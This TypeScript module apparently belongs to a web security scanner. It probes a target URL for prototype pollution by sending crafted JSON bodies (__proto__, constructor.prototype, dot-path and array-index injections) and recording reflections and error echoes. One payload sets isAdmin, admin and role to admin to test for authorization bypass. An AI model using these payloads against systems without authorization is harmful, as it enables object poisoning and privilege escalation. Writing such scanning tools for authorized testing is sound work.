import { fetchUrl } from "../adapters/http.js";
import { normalizeBody, charSimilarity } from "./normalize.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Prototype pollution surface probe: JSON body / query gadgets that, when
 *  merged into objects, poison Object.prototype. Detection is by response
 *  differential + reflected key in serialized output (observable signatures:
 *  __proto__ echoed in error, "constructor" accepted, polluted "isAdmin"
 *  changing authorization outcome). */

export interface ProtoInput {
  readonly url: string;
  readonly method?: string;
  /** JSON body template; pollution keys get merged in */
  readonly bodyTemplate?: string;
  readonly outputRoot: string;
  readonly cookie?: string;
  readonly headers?: Record<string, string>;
  readonly proxy?: string;
  readonly timeoutMs?: number;
}
export interface ProtoCase {
  readonly vector: string;
  readonly payload: string;
  readonly status: number;
  readonly bodyPrefix: string;
  readonly reflected: boolean;
  readonly errorEcho: boolean;
}
export interface ProtoResult {
  readonly probed: number;
  readonly findings: { vector: string; payload: string; status: number; evidence: string }[];
  readonly cases: ProtoCase[];
  readonly artifacts: { path: string; bytes: number }[];
}

const VECTORS: { vector: string; payload: Record<string, unknown> }[] = [
  { vector: "json.__proto__.direct", payload: JSON.parse('{"__proto__":{"polluted":"PPMARK"}}') },
  { vector: "json.constructor.prototype", payload: JSON.parse('{"constructor":{"prototype":{"polluted":"PPMARK"}}}') },
  { vector: "json.dot-path", payload: JSON.parse('{"__proto__.polluted":"PPMARK"}') },
  { vector: "json.array-index", payload: JSON.parse('{"__proto__":{"0":"PPMARK"}}') },
  { vector: "json.json-bomb", payload: JSON.parse('{"__proto__":{"isAdmin":true,"admin":true,"role":"admin","isAdmin2":true}}') },
];

export const probePrototype = async (input: ProtoInput): Promise<ProtoResult> => {
  const method = input.method ?? "POST";
  const send = async (body: string): Promise<{ status: number; body: string }> => {
    const r = await fetchUrl(input.url, { method, body, cookie: input.cookie, headers: { "content-type": "application/json", ...(input.headers ?? {}) }, proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15000 });
    return { status: r.status, body: r.body.slice(0, 3000) };
  };
  const baseBody = input.bodyTemplate ?? "{}";
  const baseline = await send(baseBody);
  const cases: ProtoCase[] = [];
  const findings: ProtoResult["findings"] = [];
  for (const v of VECTORS) {
    let merged: string;
    try {
      if (input.bodyTemplate) {
        const t = JSON.parse(input.bodyTemplate) as Record<string, unknown>;
        merged = JSON.stringify({ ...t, ...v.payload });
      } else merged = JSON.stringify(v.payload);
    } catch { merged = JSON.stringify(v.payload); }
    const r = await send(merged);
    const reflected = r.body.includes("PPMARK");
    const errorEcho = /__proto__|constructor|prototype/i.test(r.body);
    cases.push({ vector: v.vector, payload: merged.slice(0, 200), status: r.status, bodyPrefix: r.body.slice(0, 120), reflected, errorEcho });
    const sim = charSimilarity(normalizeBody(baseline.body), normalizeBody(r.body));
    if (reflected || (errorEcho && sim < 0.95)) findings.push({ vector: v.vector, payload: merged.slice(0, 200), status: r.status, evidence: reflected ? "pollution key reflected in response (server merged __proto__ into object graph)" : `prototype key echoed in error output, sim=${sim.toFixed(3)}` });
  }
  const artifacts = [
    await writeArtifact(input.outputRoot, "proto_cases.json", JSON.stringify(cases, null, 2)),
    await writeArtifact(input.outputRoot, "proto_findings.md", ["# Prototype pollution surface", "", ...findings.map(f => `- **${f.vector}** status=${f.status} — ${f.evidence}\n  - payload: \`${f.payload.slice(0, 120)}\``)].join("\n")),
  ];
  return { probed: VECTORS.length, findings, cases, artifacts };
};
